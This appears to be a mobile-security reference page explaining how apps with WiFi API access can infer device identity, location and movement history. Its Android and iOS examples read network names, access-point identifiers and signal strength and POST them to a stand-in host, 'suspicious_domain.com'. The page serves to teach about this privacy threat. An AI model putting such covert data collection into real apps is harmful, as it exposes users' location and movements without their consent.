# WiFi API Personal Identifiable Information Concerns

Mobile applications with WiFi API access can obtain Personal Identifiable Information (PII) such as network names and access points usage history, potentially leading to private data inference.

Applications using WiFi-related permissions and APIs can access sensitive information about WiFi access points (such as identifiers, names, and signal strengths) and potentially infer:

* Device unique identifiers
* Geolocation data by using surrounding WiFi access points
* User movement history and social links inference relying on repeating patterns in WiFi access point usage

### Examples

=== "Android"

 ```java
    import android.content.Context;
    import android.net.wifi.WifiInfo;
    import android.net.wifi.WifiManager;
    import java.net.HttpURLConnection;
    import java.net.URL;
    import java.io.OutputStream;
    import java.nio.charset.StandardCharsets;
    
    public class WifiInfoRetriever {
    
        private Context context;
    
        public WifiInfoRetriever(Context context) {
            this.context = context;
        }
    
        public void retrieveWifiInfo() {
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            
            if (wifiManager.isWifiEnabled()) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                
                String ssid = wifiInfo.getSSID();
                String bssid = wifiInfo.getBSSID();
                int rssi = wifiInfo.getRssi();
                String macAddress = wifiInfo.getMacAddress();
                
                // Construct JSON with data
                String jsonInputString = String.format("{\"ssid\":\"%s\", \"bssid\":\"%s\", \"rssi\":%d, \"macAddress\":\"%s\"}",
                ssid, bssid, rssi, macAddress);
                
                try {
                    // Endpoint URL
                    URL url = new URL("http://suspicious_domain.com/api/networks");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    
                    // Connection setup
                    connection.setDoOutput(true);
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    
                    try (OutputStream os = connection.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    // Additional analysis could be performed when the data reaches the endpoint
                    // such as inferring location or movement patterns of users             
                    connection.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                System.out.println("WiFi is not enabled");
            }
        }
    }
 ```

=== "iOS"

 ```swift
    import Foundation
    import SystemConfiguration.CaptiveNetwork
    import NetworkExtension
    
    class WifiInfoRetriever {
        
        func retrieveWifiInfo() {
            // Get current WiFi information
            guard let interfaces = CNCopySupportedInterfaces() as? [String] else {
                print("Unable to get network interfaces")
                return
            }
            
            var wifiData: [String: String] = [:]
            
            for interface in interfaces {
                if let networkInfo = CNCopyCurrentNetworkInfo(interface as CFString) as? [String: Any] {
                    wifiData["ssid"] = networkInfo[kCNNetworkInfoKeySSID as String] as? String
                    wifiData["bssid"] = networkInfo[kCNNetworkInfoKeyBSSID as String] as? String
                }
            }
            
            // Check if data was retrieved
            if !wifiData.isEmpty {
                // Convert to JSON
                guard let jsonData = try? JSONSerialization.data(withJSONObject: wifiData, options: []) else {
                    print("Could not convert to JSON")
                    return
                }
                
                // Create request
                guard let url = URL(string: "http://suspicious_domain.com/api/networks") else {
                    return
                }
                
                var request = URLRequest(url: url)
                request.httpMethod = "POST"
                request.httpBody = jsonData
                request.addValue("application/json", forHTTPHeaderField: "Content-Type")
                
                // Send data to server
                let task = URLSession.shared.dataTask(with: request) { data, response, error in
                    // Handle response as needed
                    // Data could be used to infer user location and movement patterns
                }
                task.resume()
            } else {
                print("WiFi information not available")
            }
        }
    }
 ```
